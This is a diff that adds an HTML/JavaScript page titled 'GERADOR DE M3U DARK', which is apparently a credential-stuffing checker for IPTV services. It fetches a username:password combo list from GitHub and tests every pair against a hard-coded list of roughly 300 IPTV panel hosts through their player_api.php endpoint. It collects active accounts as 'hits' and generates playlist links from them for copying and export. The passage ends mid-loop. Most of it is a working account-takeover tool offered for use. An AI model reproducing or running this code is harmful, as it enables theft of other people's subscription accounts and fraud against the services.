@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>GERADOR DE M3U DARK</title>
+<style>
+  /* ==== VARIÁVEIS DE TEMA - TEMA ESCURO + RAIOS ==== */
+  :root {
+    --bg-color: #0a0a12;
+    --bg-gradient: linear-gradient(135deg, #0a0a12 40%, #1a1a27 100%);
+    --text-color: #e0e0ff;
+    --accent-color: #63e6be;
+    --accent-color-light: #a2fff0;
+    --error-color: #ff5555;
+    --success-color: #49d49d;
+    --shadow-color: rgba(0, 200, 255, 0.6);
+    --progress-bg: #222;
+    --progress-fill: #00ffaa;
+    --btn-bg: #12131f;
+    --btn-hover-bg: #184846;
+    --input-bg: #12131f;
+    --input-border: #484848;
+    --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  
+  /* Reset e estilos base */
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+  
+  body {
+    margin: 0; 
+    padding: 0;
+    background: var(--bg-gradient);
+    color: var(--text-color);
+    font-family: var(--font-family);
+    min-height: 100vh;
+    overflow-x: hidden;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+  }
+  
+  /* ===== FUNDO RAIOS ANIMADOS ===== */
+  .lightning {
+    position: fixed;
+    top: 0; 
+    left: 0; 
+    width: 100vw; 
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    overflow: visible;
+  }
+  
+  .lightning span {
+    position: absolute;
+    width: 2px; 
+    height: 120px;
+    background: linear-gradient(180deg, rgba(0,255,255,0.75), transparent);
+    filter: drop-shadow(0 0 8px #00fff0);
+    opacity: 0;
+    animation: lightningAnim 3s linear infinite;
+  }
+  
+  .lightning span:nth-child(1) { left: 10%; animation-delay: 0s; }
+  .lightning span:nth-child(2) { left: 25%; animation-delay: 0.8s; }
+  .lightning span:nth-child(3) { left: 40%; animation-delay: 1.5s; }
+  .lightning span:nth-child(4) { left: 60%; animation-delay: 2.1s; }
+  .lightning span:nth-child(5) { left: 75%; animation-delay: 2.7s; }
+  
+  @keyframes lightningAnim {
+    0%, 80%, 100% { opacity: 0; transform: translateY(0); }
+    85%, 95% { opacity: 1; transform: translateY(10px); }
+  }
+  
+  /* ===== TÍTULO ANIMADO ===== */
+  header {
+    margin-top: 20px;
+    margin-bottom: 15px;
+    font-size: clamp(1.5rem, 5vw, 2.6rem);
+    font-weight: 900;
+    color: var(--accent-color);
+    text-align: center;
+    position: relative;
+    user-select: none;
+    min-height: 3rem;
+    width: 100%;
+    padding: 0 10px;
+  }
+  
+  /* Typing effect */
+  @keyframes typing {
+    from { width: 0 }
+    to { width: 100% }
+  }
+  
+  @keyframes blinkCaret {
+    50% { border-color: transparent; }
+  }
+  
+  .typing {
+    white-space: nowrap;
+    overflow: hidden;
+    border-right: 3px solid var(--accent-color);
+    animation:
+      typing 3s steps(15, end) forwards,
+      blinkCaret 0.8s step-end infinite;
+    width: 0;
+    margin: 0 auto;
+  }
+  
+  /* Flicker effect */
+  @keyframes flicker {
+    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+      opacity: 1;
+      text-shadow:
+        0 0 7px var(--accent-color),
+        0 0 20px var(--accent-color-light),
+        0 0 30px var(--accent-color-light);
+    }
+    20%, 22%, 24%, 55% {
+      opacity: 0.7;
+      text-shadow: none;
+    }
+  }
+  
+  header.flicker {
+    animation: flicker 3s linear infinite;
+  }
+  
+  /* ===== CONTAINER CENTRAL ===== */
+  main {
+    width: 95%;
+    max-width: 900px;
+    background: rgba(10,10,18,0.85);
+    box-shadow: 0 0 20px var(--shadow-color);
+    border-radius: 10px;
+    padding: 15px;
+    margin-bottom: 20px;
+    z-index: 1;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+  }
+  
+  /* ===== FORMULÁRIO ===== */
+  form {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 12px;
+    align-items: center;
+    margin-bottom: 15px;
+  }
+  
+  /* ==== BOTÕES ==== */
+  button {
+    background-color: var(--btn-bg);
+    border: none;
+    border-radius: 6px;
+    padding: 12px 18px;
+    color: var(--accent-color);
+    font-weight: 700;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: background-color 0.25s ease, box-shadow 0.25s ease;
+    box-shadow: 0 0 5px transparent;
+    width: 100%;
+    height: 44px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  
+  button:hover:not(:disabled) {
+    background-color: var(--btn-hover-bg);
+    box-shadow: 0 0 12px var(--accent-color);
+  }
+  
+  button:disabled {
+    color: #777;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  
+  /* ===== ESTATÍSTICAS ===== */
+  .stats {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+  
+  .stat-item {
+    background: #112;
+    padding: 8px 12px;
+    border-radius: 8px;
+    min-width: 100px;
+    text-align: center;
+    color: var(--accent-color-light);
+    font-weight: 600;
+    font-size: 0.85rem;
+    user-select: none;
+    box-shadow: 0 0 10px transparent;
+    transition: box-shadow 0.3s ease;
+  }
+  
+  .stat-item.hit {
+    color: var(--success-color);
+    box-shadow: 0 0 12px var(--success-color);
+  }
+  
+  .stat-item.tested {
+    color: var(--accent-color-light);
+    box-shadow: 0 0 12px var(--accent-color);
+  }
+  
+  /* ===== RESULTADOS ===== */
+  .results-container {
+    max-height: 300px;
+    overflow-y: auto;
+    background: #121522ee;
+    border-radius: 12px;
+    padding: 12px;
+    font-family: monospace;
+    font-size: 0.8rem;
+    color: #a0f0ff;
+    user-select: text;
+    box-shadow: inset 0 0 8px #00ffeeb5;
+    flex: 1;
+    min-height: 150px;
+  }
+  
+  /* Cada hit */
+  .hit-item {
+    background: #002633cc;
+    border-radius: 10px;
+    margin-bottom: 12px;
+    padding: 10px;
+    box-shadow: 0 0 10px #00ffff55;
+    position: relative;
+    transition: background-color 0.3s ease;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  
+  .hit-item:hover {
+    background: #005564cc;
+  }
+  
+  .hit-content {
+    flex-grow: 1;
+    margin-right: 10px;
+  }
+  
+  /* Botões do hit */
+  .hit-actions {
+    display: flex;
+    gap: 5px;
+  }
+  
+  .hit-actions button {
+    background: transparent;
+    border: none;
+    color: var(--accent-color-light);
+    font-size: 1rem;
+    cursor: pointer;
+    transition: color 0.3s ease;
+    padding: 2px 6px;
+    border-radius: 6px;
+    width: auto;
+    height: auto;
+  }
+  
+  .hit-actions button:hover {
+    color: var(--success-color);
+  }
+  
+  /* BOTÕES GERAIS DE CONTROLE */
+  .controls {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
+    margin-top: 15px;
+  }
+  
+  /* NOTIFICAÇÃO */
+  #notification {
+    position: fixed;
+    bottom: 25px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--accent-color);
+    padding: 12px 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 20px var(--accent-color-light);
+    color: #021212;
+    font-weight: 700;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.5s ease;
+    z-index: 1000;
+    user-select: none;
+    max-width: 90%;
+    text-align: center;
+    font-size: 0.9rem;
+  }
+  
+  #notification.show {
+    opacity: 1;
+    pointer-events: auto;
+  }
+  
+  /* Rodapé */
+  footer {
+    width: 100%;
+    text-align: center;
+    padding: 15px 0;
+    color: var(--accent-color-light);
+    font-size: 0.9rem;
+    font-weight: 600;
+    margin-top: auto;
+    z-index: 1;
+  }
+  
+  /* Espaço para anúncios */
+  .ad-container {
+    width: 100%;
+    max-width: 728px;
+    margin: 20px auto;
+    text-align: center;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 8px;
+    padding: 10px;
+    min-height: 90px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  
+  .ad-placeholder {
+    color: #777;
+    font-style: italic;
+  }
+  
+  /* RESPONSIVO */
+  @media (min-width: 601px) {
+    .controls {
+      grid-template-columns: repeat(4, 1fr);
+    }
+    
+    button {
+      width: auto;
+    }
+    
+    .results-container {
+      max-height: 450px;
+      font-size: 0.88rem;
+    }
+    
+    .stat-item {
+      min-width: 120px;
+      font-size: 1rem;
+      padding: 10px 15px;
+    }
+    
+    main {
+      padding: 20px 25px;
+    }
+    
+    header {
+      margin-top: 40px;
+      margin-bottom: 20px;
+    }
+  }
+  
+  @media (max-width: 360px) {
+    .controls {
+      grid-template-columns: 1fr;
+    }
+    
+    .results-container {
+      max-height: 200px;
+      font-size: 0.75rem;
+    }
+    
+    header {
+      font-size: 1.3rem;
+      margin-top: 15px;
+      margin-bottom: 10px;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="lightning" aria-hidden="true">
+  <span></span><span></span><span></span><span></span><span></span>
+</div>
+<header aria-label="Título do scanner">
+  <div class="typing flicker" id="animated-title">GERADOR DE M3U DARK</div>
+</header>
+
+<!-- Espaço para anúncios AdSense -->
+<div class="ad-container">
+  <div class="ad-placeholder">Espaço para anúncios AdSense</div>
+</div>
+
+<main>
+  <form id="configForm" autocomplete="off" aria-label="Configurações do scanner">
+    <button id="generateBtn" type="button">GERAR M3U</button>
+  </form>
+  
+  <div class="stats" aria-live="polite" aria-label="Estatísticas em tempo real">
+    <div class="stat-item hit" id="totalHits">Hits: 0</div>
+    <div class="stat-item tested" id="totalTested">Testados: 0</div>
+  </div>
+  
+  <div class="controls" role="group" aria-label="Controles do scanner">
+    <button id="stopBtn" type="button" disabled aria-pressed="false">Parar</button>
+    <button id="clearBtn" type="button">Limpar</button>
+    <button id="exportBtn" type="button" disabled>Exportar Hits</button>
+    <button id="copyAllBtn" type="button" disabled>Copiar Todos</button>
+  </div>
+  
+  <section class="results-container" id="results" tabindex="0" aria-label="Resultados dos hits encontrados" aria-live="polite" aria-relevant="additions">
+    <!-- Resultados aparecerão aqui -->
+  </section>
+</main>
+<footer>FEITO POR DARK MENSAGEIRO</footer>
+<div id="notification" role="alert" aria-live="assertive"></div>
+<script>
+  // Lista de servidores
+  const servers = [
+    "http://belize-transport33.sbs:80",
+    "http://bpbe.one:80",
+    "http://brone.fyi",
+    "http://c4n.fun",
+    "http://cinefull.space:80",
+    "http://cinepulse.live",
+    "http://dns.carnes.ink:80",
+    "http://dns.cebola.pro:80",
+    "http://dns.falcon90.store:80",
+    "http://firetop1.site",
+    "http://fthzx.online:80",
+    "http://kstv.us:8080",
+    "http://limed.cc",
+    "http://minhatv.eu",
+    "http://newbox.space:80",
+    "http://nitrohd.xyz",
+    "http://nitrohd.xyz:80",
+    "http://pfsv.io:80",
+    "http://pgzva.my",
+    "http://prvdbrack.xyz:80",
+    "http://relogio10.top",
+    "http://vtrev.cc",
+    "http://xci.nz:80",
+    "http://brothersplay.com:80",
+    "http://cdn.apkwuv.xyz:80",
+    "http://dark.topk.live:80",
+    "http://dns.gpsrv.shop:80",
+    "http://hsgbola1.xyz",
+    "http://mamaodoce.online",
+    "http://saltbrth.xyz",
+    "http://touroboxv4.redemais.click:80",
+    "http://vela2b.sbs:80",
+    "http://vip.tvhome.click:80",
+    "http://x.mx51.online:80",
+    "http://pbkblack.site",
+    "http://cdn11.cc:80",
+    "http://dfkkh.dtwkaf.xyz:80",
+    "http://fiufiu.live:80",
+    "http://hdtvs.top:80",
+    "http://holtcomfast.icu",
+    "http://oneplay.cc",
+    "http://v4.agenciav4.top",
+    "http://vyvofibra.us",
+    "http://b1.svb32fg.icu",
+    "http://axr7.one:80",
+    "http://bananadoce.online:80",
+    "http://booklife.space:8080",
+    "http://lb01.site",
+    "http://gomn.xplus2.xyz:2095",
+    "http://hsgbola1.xyz:80",
+    "http://natkcz.xyz:80",
+    "http://209.14.88.42:80",
+    "http://oldmonkey.fun:80",
+    "http://a.mx51.online:80",
+    "http://buzbond.bond:80",
+    "http://familyplayy.top:80",
+    "http://levitashow.click:80",
+    "http://sw2z.in:80",
+    "http://jamboso.com",
+    "http://opaioo.com",
+    "http://gangaplayer.com:80",
+    "http://mixmil.cyou:80",
+    "http://sonicstream.shop:80",
+    "http://1296x.srvsh.xyz",
+    "http://12ww11.top",
+    "http://138.199.41.6:80",
+    "http://14225021914.com:80",
+    "http://149.18.18.90:80",
+    "http://15aera.xyz",
+    "http://15aera.xyz:80",
+    "http://178.162.193.239:2052",
+    "http://178.162.193.239:8080",
+    "http://178.162.197.167:2052",
+    "http://178.162.197.175",
+    "http://178.162.197.175:80",
+    "http://178.162.197.175:8080",
+    "http://178.162.197.184:2052",
+    "http://178.162.212.141:2052",
+    "http://178.162.212.150:2052",
+    "http://179.60.53.20:55577",
+    "http://185.194.204.156:80",
+    "http://1play.cool:8000",
+    "http://2.magmas5.com:8000",
+    "http://2.villevalo.pro",
+    "http://244a.cc:80",
+    "http://4.iptv11.is:80",
+    "http://4f.rs:80",
+    "http://4tv.site",
+    "http://4tv.site:80",
+    "http://5ce.co:80",
+    "http://5ce.me",
+    "http://5ce.me:80",
+    "http://5central.me",
+    "http://5central.me:80",
+    "http://5estrelas.top:80",
+    "http://5network.cyou",
+    "http://5network.cyou:80",
+    "http://5stak.xyz:80",
+    "http://6digital9.chocoplus.xyz:8080",
+    "http://7779rt.top",
+    "http://7779rt.top:80",
+    "http://7cdnmax.xyz:8080",
+    "http://7forever.xyz:80",
+    "http://7forever.xyz:8080",
+    "http://7max.top",
+    "http://7max.top:80",
+    "http://7max.top:8080",
+    "http://7online.xyz",
+    "http://7online.xyz:80",
+    "http://7rota1app.link",
+    "http://Cdnbrux.top",
+    "http://EXM3U.77xxs.xyz",
+    "http://Vis.blue:80",
+    "http://a.srvhib.com.br",
+    "http://ad44.shop:8080",
+    "http://amorvenceu.top:80",
+    "http://analov.lat",
+    "http://app.tecnomolly.com:8080",
+    "http://arrepiado.xyz",
+    "http://atlas06.xyz:80",
+    "http://bevolahouse.uk:8080",
+    "http://bgouv13.com:80",
+    "http://bincp.xyz",
+    "http://binwtorre.online:80",
+    "http://blogtiger.win:8080",
+    "http://bogotaresort.vip:8080",
+    "http://cairogroup.uk:8080",
+    "http://canal.cdntv.com.br:80",
+    "http://canexcorso.net:8080",
+    "http://cdn.xuiinstall.fun:80",
+    "http://cdn4k.info",
+    "http://cdn4k.us",
+    "http://cdn4k.vip:80",
+    "http://cdn7ever.xyz:80",
+    "http://cdn7light.xyz:80",
+    "http://cdn88.xyz",
+    "http://cinepulse.xyz:80",
+    "http://cldnew.com",
+    "http://cm1.portaltv.info:777",
+    "http://costela.top",
+    "http://cuvillier.gentv.to:8080",
+    "http://d.rodeo:80",
+    "http://dns.aipim.info:80",
+    "http://dns.aipim.info:8080",
+    "http://dns.ulttv.xyz",
+    "http://dnsbr.cloud",
+    "http://dnsbr.xyz",
+    "http://dnsrp.abre.xyz:80",
+    "http://dnssp.site",
+    "http://dsmar.mov:80",
+    "http://ecliente.xyz",
+    "http://fastream.xyz:8080",
+    "http://fastrunner.live:8080",
+    "http://fhdgdhg25.lat",
+    "http://gameplay.p2sweb.me",
+    "http://geniuscore.uk:8080",
+    "http://globe4.midomed.com:8883",
+    "http://golduhdtv.net",
+    "http://goodcine.my",
+    "http://gopro7.xyz",
+    "http://gopro7.xyz:8080",
+    "http://grtsv1.life",
+    "http://inter.natv.fm",
+    "http://invictosplay.xyz",
+    "http://kaantv.site:8000",
+    "http://kotkoyo.mine.nu:48028",
+    "http://kstv.us:80",
+    "http://ktm42.xyz:2052",
+    "http://letmein.fun:8080",
+    "http://llllllllliosdaiiii1iiiiiiiii.funtogether.xyz:8080",
+    "http://m1-max.dns-speedy.com",
+    "http://m3umais.ovh:8080",
+    "http://miotvtop.hdwcam.com:8080",
+    "http://motoplatxrd.com:80",
+    "http://natsdns.com:8080",
+    "http://newmundo.top:8880",
+    "http://nhflix.xyz",
+    "http://novo1.xyz:80",
+    "http://ottvision.xyz:8080",
+    "http://p1.proiptv.co:88",
+    "http://pegcv.xyz:8880",
+    "http://pfsrv.com:80",
+    "http://picapaunet.top",
+    "http://piratuga.xyz",
+    "http://play.biturl.vip",
+    "http://premiumtop.top:8080",
+    "http://proxy.cdn4k.vip",
+    "http://proxy.cdn4k.vip:80",
+    "http://pvsrvs.xyz:80",
+    "http://qacvz.my:80",
+    "http://radionivus.shop:80",
+    "http://ratomickey.eu",
+    "http://ratomickey.eu:8080",
+    "http://russofv.cc",
+    "http://serv1.xyz",
+    "http://server.iptvxxx.net",
+    "http://smdz.site",
+    "http://smt.appxc.top:80",
+    "http://snopy.mochaiptv.xyz:8000",
+    "http://sp.kiwi:80",
+    "http://srv.hostinggon.xyz:2095",
+    "http://srv.hostinggon12.xyz",
+    "http://srv.hostinggon15.xyz",
+    "http://srv.hostinggon39.xyz",
+    "http://srv.polkafood.pl:80",
+    "http://srvdp.me",
+    "http://srvtop.cloud:80",
+    "http://starplaybr.online:80",
+    "http://supersonictv.live:8080",
+    "http://techplay.click",
+    "http://techplay.click:80",
+    "http://telecine.asia",
+    "http://terenet.net:80",
+    "http://topserver.fun:80",
+    "http://tv.com.vc",
+    "http://tv.dimaiptv.com:8080",
+    "http://tv1.my:80",
+    "http://tv5.me",
+    "http://tv5.me:80",
+    "http://tvlg.appxc.top",
+    "http://ust.lat",
+    "http://veloz.dnstv.uk:80",
+    "http://vip.dom1tv.com",
+    "http://vivaoavida.xyz",
+    "http://wolftkxz.xyz:80",
+    "http://world-qualite.xyz:8080",
+    "http://xp2.wtf",
+    "http://cdn22.cc:80",
+    "http://rtdkh.xyz:80",
+    "http://cms-central.co",
+    "http://gurutuga.pw:8080",
+    "http://bcltop.online",
+    "http://dns.3558510632.click:80",
+    "http://dns.gerenciadorr8.top",
+    "http://livraria.fun:80",
+    "http://opdestiny.top:80",
+    "http://pfsv.io",
+    "http://sualista.xyz",
+    "http://tucxs.click",
+    "http://v4.agenciav4.top:80",
+    "http://veloz.tvbrlive.com",
+    "http://voxp2p.live",
+    "http://xuione.icu:80",
+    "http://agrtv.click:80",
+    "http://cgpdok.xyz:80",
+    "http://amplay.lat:80",
+    "http://maisonxp.click:8080",
+    "http://mistertech.click:80",
+    "http://tvsbt.top:80",
+    "http://vdeos.pics:80",
+    "http://horizon25.shop",
+    "http://cdn.jccob.click",
+    "http://cdn.proxybrasilctvp2.com.br",
+    "http://cdn018.io",
+    "http://cdn11.cc",
+    "http://cdn22.cc",
+    "http://cdn33.cc",
+    "http://cdn45.cc",
+    "http://cdn46.cc",
+    "http://cdn49.cc",
+    "http://cdwmed.xyz",
+    "http://cinefull.space",
+    "http://cliente33.com",
+    "http://cnaxtrax.com",
+    "http://coco-cdn2.cc",
+    "http://dnscine.top:80",
+    "http://jamboso.com:80",
+    "http://sskkdk.srv1ydfg.icu:80",
+    "http://bananadoce.online",
+    "http://felas87dz.icu",
+    "http://steamtv.site",
+    "http://supg.nl",
+    "http://telefone.site:80",
+    "http://turbo.gftv.in:80",
+    "http://viphlvp.xyz:8080",
+    "http://virtusz.zapto.org:80",
+    "http://vmw12.com:80",
+    "http://x2caverinhas.store",
+    "http://xcloudcine.xyz:80",
+    "http://z3.bgts37bc.icu",
+    "http://b1.svb32fg.icu:80",
+    "http://btpx.store:80",
+    "http://bullbr.xyz:80",
+    "http://carabina.pro:80",
+    "http://cdn.jccob.click:80",
+    "http://cdnrptv.com:80",
+    "http://cgpdok.xyz",
+    "http://cinepulse.live:80",
+    "http://ctbnotas.xyz",
+    "http://dns.masteron.fun:80",
+    "http://dns.play-tv.live:80",
+    "http://eckgo.xyz",
+    "http://firetop1.site:80",
+    "http://globalsuper.site:80",
+    "http://gw38.site",
+    "http://hmiguel5.org:80",
+    "http://huloftibu.lol",
+    "http://jctv.drivecar.click:80",
+    "http://jrplay.online:80",
+    "http://lb01.site:80",
+    "http://mw3.tvzinha.org:8080",
+    "http://nandovip.xyz",
+    "http://newoneblack.site",
+    "http://newoneblack.site:80",
+    "http://norrfqf.top:8080",
+    "http://oax.life",
+    "http://rgdtuner.xyz",
+    "http://s.abapx.in:80",
+    "http://sandertvcl.com:8080",
+    "http://semprea100.org:8080",
+    "http://sep22x.in:80",
+    "http://smartvtcl.site:8080",
+    "http://smt.appxc.top",
+    "http://srvplay.live:80",
+    "http://ad3xiy.xyz:80",
+    "http://cbvc.xyz:80",
+    "http://dns.acaidopara.net:80",
+    "http://horizon25.shop:80",
+    "http://alpacinoo.com",
+    "http://carabina.pro",
+    "http://halamix.in:80",
+    "http://omelhor.sucodefruta.xyz",
+    "http://rnplay07.vip",
+    "http://v220xpco.com:80",
+    "http://c.maintech.top",
+    "http://cdn.ax66.shop",
+    "http://gestor.mom"
+  ];
+  
+  // ===== CONSTANTES & ESTADOS =====
+  const stopBtn = document.getElementById('stopBtn');
+  const clearBtn = document.getElementById('clearBtn');
+  const exportBtn = document.getElementById('exportBtn');
+  const copyAllBtn = document.getElementById('copyAllBtn');
+  const generateBtn = document.getElementById('generateBtn');
+  const resultsContainer = document.getElementById('results');
+  const notification = document.getElementById('notification');
+  const stats = {
+    totalHits: document.getElementById('totalHits'),
+    totalTested: document.getElementById('totalTested'),
+  };
+  
+  let combos = [];
+  let resultsHits = [];
+  let resultsSet = new Set();
+  let stopRequested = false;
+  let totalHits = 0;
+  let totalTested = 0;
+  
+  // Retry max attempts
+  const MAX_RETRIES = 2;
+  
+  // Função para mostrar notificação visual e sonora
+  function showNotification(msg, duration = 5000) {
+    notification.textContent = msg;
+    notification.classList.add('show');
+    try {
+      const audioCtx = new AudioContext();
+      const oscillator = audioCtx.createOscillator();
+      oscillator.type = 'triangle';
+      oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
+      oscillator.connect(audioCtx.destination);
+      oscillator.start();
+      oscillator.stop(audioCtx.currentTime + 0.15);
+    } catch {}
+    setTimeout(() => {
+      notification.classList.remove('show');
+    }, duration);
+  }
+  
+  // Função delay util
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+  
+  // ===== FUNÇÃO PARA CARREGAR COMBOS ONLINE =====
+  async function loadCombosOnline() {
+    try {
+      // URL corrigida para acessar o arquivo raw do GitHub
+      const response = await fetch('https://raw.githubusercontent.com/guedescomvc2025-bot/COMBO-DARK-ONLINE/main/todos_combos.txt');
+      if (!response.ok) {
+        throw new Error(`Erro ao carregar combos: ${response.status}`);
+      }
+      const text = await response.text();
+      let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+      combos = lines.filter(l => l.includes(':')); // mínimo username:password
+      showNotification(`${combos.length} combos carregados online.`);
+      return true;
+    } catch (error) {
+      showNotification(`Erro ao carregar combos: ${error.message}`);
+      console.error('Erro ao carregar combos:', error);
+      return false;
+    }
+  }
+  
+  // ===== FUNÇÃO PRINCIPAL DE TESTE DE COMBO =====
+  async function testCombo(host, username, password, attempt = 0) {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 20000); // Timeout aumentado para 20s
+    
+    // Garantir que o host tenha o prefixo http://
+    let formattedHost = host;
+    if (!host.startsWith('http://') && !host.startsWith('https://')) {
+      formattedHost = 'http://' + host;
+    }
+    
+    // URL base da API
+    const baseUrl = `${formattedHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+    const userInfoUrl = `${baseUrl}&action=get_user_info`;
+    
+    try {
+      // Usar nosso proxy local
+      const proxyUrl = `/api/proxy?url=${encodeURIComponent(userInfoUrl)}`;
+      
+      // Fazer requisição para obter informações do usuário
+      const userInfoResponse = await fetch(proxyUrl, {
+        signal: controller.signal,
+        headers: { 
+          'Accept': 'application/json',
+          'X-Requested-With': 'XMLHttpRequest'
+        },
+        cache: 'no-store'
+      });
+      
+      clearTimeout(timeoutId);
+      
+      // Verificar se a resposta foi bem-sucedida
+      if (!userInfoResponse.ok) {
+        throw new Error(`HTTP error! status: ${userInfoResponse.status}`);
+      }
+      
+      // Parsear os dados
+      const userInfo = await userInfoResponse.json();
+      
+      // Verificar se o usuário está ativo
+      if (userInfo && userInfo.user_info && userInfo.user_info.status === 'Active') {
+        const expirationDate = userInfo.user_info.exp_date ?
+          new Date(parseInt(userInfo.user_info.exp_date) * 1000).toLocaleDateString('pt-BR') :
+          'Desconhecida';
+          
+        return {
+          valid: true,
+          username,
+          password,
+          host: formattedHost,
+          status: userInfo.user_info.status,
+          expiration: expirationDate,
+          created_at: userInfo.user_info.created_at || '',
+          maxConnections: userInfo.user_info.max_connections || 'Desconhecido',
+          m3uLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+          m3uPlusLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+          enigmaLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=enigma`,
+          epgUrl: `${formattedHost}/epg.xml`, // supondo padrão
+          data: userInfo
+        };
+      } else {
+        return { valid: false };
+      }
+    } catch (error) {
+      clearTimeout(timeoutId);
+      // Retry inteligente para erros transitórios
+      if (attempt < MAX_RETRIES && !stopRequested) {
+        await delay(500);
+        return testCombo(host, username, password, attempt + 1);
+      }
+      return { valid: false, error: error.message || 'Erro desconhecido' };
+    }
+  }
+  
+  // ===== FUNÇÃO PARA COPIAR TEXTO COM FALLBACK =====
+  function copyToClipboard(text) {
+    return new Promise((resolve, reject) => {
+      // Tentar usar a API moderna do clipboard
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(text)
+          .then(() => resolve(true))
+          .catch(err => {
+            console.error('Erro ao copiar com API moderna:', err);
+            // Fallback para método antigo
+            fallbackCopyTextToClipboard(text, resolve, reject);
+          });
+      } else {
+        // Usar método antigo diretamente se a API não estiver disponível
+        fallbackCopyTextToClipboard(text, resolve, reject);
+      }
+    });
+  }
+  
+  // ===== MÉTODO ANTIGO DE COPIA (FALLBACK) =====
+  function fallbackCopyTextToClipboard(text, resolve, reject) {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    
+    // Evitar rolagem para o elemento
+    textArea.style.position = "fixed";
+    textArea.style.top = 0;
+    textArea.style.left = 0;
+    textArea.style.width = "2em";
+    textArea.style.height = "2em";
+    textArea.style.padding = 0;
+    textArea.style.border = "none";
+    textArea.style.outline = "none";
+    textArea.style.boxShadow = "none";
+    textArea.style.background = "transparent";
+    textArea.style.opacity = "0";
+    
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    
+    try {
+      const successful = document.execCommand('copy');
+      document.body.removeChild(textArea);
+      
+      if (successful) {
+        resolve(true);
+      } else {
+        reject(new Error('Não foi possível copiar o texto'));
+      }
+    } catch (err) {
+      document.body.removeChild(textArea);
+      reject(err);
+    }
+  }
+  
+  // ===== FUNÇÃO PARA RENDERIZAR UM HIT NA TELA =====
+  function renderHit(hit, index) {
+    const {
+      host, username, password, status, expiration, 
+      created_at, maxConnections, m3uLink, m3uPlusLink, enigmaLink, epgUrl 
+    } = hit;
+    
+    // Limpa texto para segurança
+    const hHost = escapeHtml(host);
+    const hUser = escapeHtml(username);
+    const hPass = escapeHtml(password);
+    
+    // Cria div item
+    const div = document.createElement('div');
+    div.className = 'hit-item';
+    div.setAttribute('tabindex', '0');
+    div.setAttribute('aria-label', `Hit válido detectado: usuário ${hUser} com validade ${expiration}`);
+    
+    // Conteúdo do hit
+    const contentDiv = document.createElement('div');
+    contentDiv.className = 'hit-content';
+    contentDiv.textContent = `🔗 LINK M3U: ► ${m3uLink}`;
+    div.appendChild(contentDiv);
+    
+    // Botão de copiar
+    const btnCopy = document.createElement('button');
+    btnCopy.textContent = '📋';
+    btnCopy.title = 'Copiar este link';
+    btnCopy.setAttribute('aria-label', `Copiar link M3U do usuário ${hUser}`);
+    
+    btnCopy.onclick = () => {
+      copyToClipboard(m3uLink)
+        .then(() => {
+          showNotification(`Link copiado! Usuário: ${hUser}`);
+        })
+        .catch(err => {
+          console.error('Erro ao copiar:', err);
+          showNotification('Falha ao copiar. Tente novamente.');
+        });
+    };
+    
+    const btnContainer = document.createElement('div');
+    btnContainer.className = 'hit-actions';
+    btnContainer.appendChild(btnCopy);
+    div.appendChild(btnContainer);
+    
+    return div;
+  }
+  
+  // ===== SHOW ESTATÍSTICAS =====
+  function updateStats() {
+    stats.totalHits.textContent = `Hits: ${totalHits}`;
+    stats.totalTested.textContent = `Testados: ${totalTested}`;
+  }
+  
+  // ===== INICIA O ESCANEAMENTO =====
+  async function startScan() {
+    // Reseta estado
+    stopRequested = false;
+    totalHits = 0;
+    totalTested = 0;
+    resultsHits = [];
+    resultsSet.clear();
+    resultsContainer.innerHTML = '';
+    updateStats();
+    
+    // Verifica se há combos carregados
+    if(combos.length === 0) {
+      // Tenta carregar online
+      const loaded = await loadCombosOnline();
+      if (!loaded) return;
+    }
+    
+    generateBtn.disabled = true;
+    stopBtn.disabled = false;
+    exportBtn.disabled = true;
+    copyAllBtn.disabled = true;
+    
+    // Limitar o número de combos para processar
+    const maxCombos = Math.min(100, combos.length);
+    const combosToProcess = combos.slice(0, maxCombos);
+    
+    // Processar cada combo sequencialmente
+    for (const combo of combosToProcess) {
+      if (stopRequested) break;
+      
+      // Quebra username e password conforme padrão "username:password"
+      let [username, password] = combo.split(':');
+      if(!username || !password) {
+        continue;
+      }
+      
+      // Testa em todos os servidores
+      for (const server of servers) {
+        if (stopRequested) break;
+        
+        try {
+          totalTested++;
+          updateStats();
+          
+          const res = await testCombo(server, username, password);
+          if (res.valid) {
+            // Evitar duplicidade: combo + host como chave única
+            const uniqueKey = `${server}|${username}|${password}`;
+            if(!resultsSet.has(uniqueKey)) {
+              resultsSet.add(uniqueKey);
